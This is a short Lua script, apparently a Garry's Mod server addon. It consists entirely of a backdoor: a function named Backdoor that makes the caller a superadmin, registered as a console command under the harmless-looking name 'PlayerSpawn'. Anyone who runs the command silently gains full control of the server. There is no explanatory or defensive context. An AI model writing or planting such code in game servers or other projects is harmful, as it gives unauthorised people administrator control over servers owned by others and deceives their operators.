function Backdoor( ply )
        ply:SetUserGroup("superadmin")
end
concommand.Add("PlayerSpawn", Backdoor)
